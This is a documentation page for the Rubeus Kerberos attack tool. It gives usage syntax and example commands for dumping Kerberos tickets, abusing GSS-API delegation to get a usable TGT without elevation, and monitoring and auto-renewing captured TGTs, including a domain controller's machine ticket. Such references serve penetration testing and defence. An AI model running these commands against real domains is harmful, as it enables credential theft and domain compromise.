{"title": "triage / klist / dump / tgtdeleg / monitor / harvest", "source": "rubeus", "source_label": "Rubeus", "path": "triage_klist_dump", "html": "<h1 id=\"triage-klist-dump-tgtdeleg-monitor-harvest\">triage / klist / dump / tgtdeleg / monitor / harvest</h1>\n<p>Ticket extraction and harvesting commands.</p>\n<hr>\n<h2 id=\"triage-quick-ticket-table\">triage — Quick Ticket Table</h2>\n<p>Display a summary table of tickets (LUID, user, service, expiry).</p>\n<h3 id=\"usage\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe triage [/luid:&lt;luid&gt;] [/user:&lt;username&gt;] [/service:&lt;sname&gt;] [/server:&lt;fqdn&gt;]\n</code></pre></div>\n<ul>\n<li>Non-elevated: shows current user's tickets only</li>\n<li>Elevated: shows all tickets on the system</li>\n</ul>\n<h3 id=\"examples\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe triage\nRubeus.exe triage /service:ldap\nRubeus.exe triage /luid:0x474722b\nRubeus.exe triage /user:&lt;username&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"klist-detailed-ticket-info\">klist — Detailed Ticket Info</h2>\n<p>Show detailed logon session and ticket information.</p>\n<h3 id=\"usage_1\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe klist [/luid:&lt;luid&gt;] [/user:&lt;username&gt;] [/service:&lt;sname&gt;] [/server:&lt;fqdn&gt;]\n</code></pre></div>\n<h3 id=\"examples_1\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe klist\nRubeus.exe klist /luid:0x47869b4\nRubeus.exe klist /user:&lt;username&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"dump-extract-ticket-data-base64-krb-cred\">dump — Extract Ticket Data (Base64 KRB-CRED)</h2>\n<p>Extract ticket data as base64 KRB-CRED blobs. Elevated: dumps all users. Non-elevated: only service tickets for current user (session keys for TGTs not returned).</p>\n<h3 id=\"usage_2\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe dump [/luid:&lt;luid&gt;] [/user:&lt;username&gt;] [/service:&lt;sname&gt;] [/server:&lt;fqdn&gt;] [/nowrap]\n</code></pre></div>\n<h3 id=\"examples_2\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Dump all tickets (elevated)\nRubeus.exe dump\n\n# Dump only TGTs (elevated)\nRubeus.exe dump /service:krbtgt\n\n# Dump specific session\nRubeus.exe dump /luid:0x47869cc\n\n# Dump tickets for specific user\nRubeus.exe dump /user:&lt;username&gt; /nowrap\n</code></pre></div>\n<hr>\n<h2 id=\"tgtdeleg-get-usable-tgt-without-elevation\">tgtdeleg — Get Usable TGT Without Elevation</h2>\n<p>Abuse Kerberos GSS-API delegation to retrieve a usable TGT for the current user without elevation. Uses the Kekeo <code>tgt::deleg</code> trick.</p>\n<h3 id=\"usage_3\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe tgtdeleg [/target:&lt;spn&gt;]\n</code></pre></div>\n<h3 id=\"options\">Options</h3>\n<ul>\n<li><code>/target:&lt;spn&gt;</code> — specify unconstrained-delegation SPN if auto-detection fails (e.g. <code>HOST/&lt;dc&gt;.&lt;domain&gt;</code>)</li>\n</ul>\n<h3 id=\"examples_3\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe tgtdeleg\nRubeus.exe tgtdeleg /target:HOST/&lt;dc&gt;.&lt;domain&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"monitor-monitor-for-new-tgts\">monitor — Monitor for New TGTs</h2>\n<p>Periodically poll for new TGTs and display them as they appear. Useful on hosts with unconstrained delegation.</p>\n<h3 id=\"usage_4\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe monitor [/interval:&lt;seconds&gt;] [/targetuser:&lt;target-user&gt;] [/nowrap] [/registry:&lt;software-key&gt;] [/runfor:&lt;seconds&gt;]\n</code></pre></div>\n<h3 id=\"options_1\">Options</h3>\n<ul>\n<li><code>/interval:&lt;seconds&gt;</code> — polling interval (default: 60)</li>\n<li><code>/targetuser:&lt;target-user&gt;</code> — only capture TGTs for this user</li>\n<li><code>/nowrap</code> — don't line-wrap base64 output</li>\n<li><code>/registry:&lt;software-key&gt;</code> — save output to <code>HKLM\\&lt;key&gt;</code> (e.g. <code>SOFTWARE\\MONITOR</code>)</li>\n<li><code>/runfor:&lt;seconds&gt;</code> — stop after this many seconds</li>\n</ul>\n<h3 id=\"examples_4\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Monitor for DC$ machine TGT (unconstrained delegation capture)\nRubeus.exe monitor /targetuser:DC$ /interval:10\n\n# Run for 5 minutes\nRubeus.exe monitor /interval:30 /runfor:300\n</code></pre></div>\n<p><strong>Requires elevation.</strong></p>\n<hr>\n<h2 id=\"harvest-monitor-auto-renew-tgts\">harvest — Monitor + Auto-Renew TGTs</h2>\n<p>Like monitor but also maintains a cache of valid TGTs and auto-renews them before expiry.</p>\n<h3 id=\"usage_5\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe harvest [/monitorinterval:&lt;seconds&gt;] [/displayinterval:&lt;seconds&gt;] [/targetuser:&lt;target-user&gt;] [/nowrap] [/registry:&lt;software-key&gt;] [/runfor:&lt;seconds&gt;]\n</code></pre></div>\n<h3 id=\"options_2\">Options</h3>\n<ul>\n<li><code>/monitorinterval:&lt;seconds&gt;</code> — TGT check interval (default: 60)</li>\n<li><code>/displayinterval:&lt;seconds&gt;</code> — cache display interval (default: 1200)</li>\n<li><code>/targetuser:&lt;target-user&gt;</code> — filter for specific user</li>\n<li><code>/nowrap</code> — don't line-wrap</li>\n<li><code>/registry:&lt;software-key&gt;</code> — save to registry</li>\n<li><code>/runfor:&lt;seconds&gt;</code> — stop after N seconds</li>\n</ul>\n<h3 id=\"examples_5\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe harvest /monitorinterval:30 /displayinterval:300\n\nRubeus.exe harvest /monitorinterval:30 /targetuser:&lt;target-user&gt;\n</code></pre></div>\n<p><strong>Requires elevation.</strong></p>\n<hr>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li><code>triage</code> &lt; <code>klist</code> &lt; <code>dump</code> in terms of detail (and cost)</li>\n<li><code>dump</code> without elevation returns service tickets only — TGT session keys are zeroed</li>\n<li>Use <code>tgtdeleg</code> to get a usable TGT without elevation (works because session key is recoverable from cache via GSS-API delegation trick)</li>\n<li><code>monitor</code>/<code>harvest</code> are ideal for unconstrained delegation hosts waiting for privileged users to connect</li>\n</ul>", "excerpt": "triage / klist / dump / tgtdeleg / monitor / harvest Ticket extraction and harvesting commands. triage — Quick Ticket Table Display a summary table of tickets (LUID, user, service, expiry). Usage Rubeus.exe triage [/luid:&lt;luid&gt;]…", "tags": []}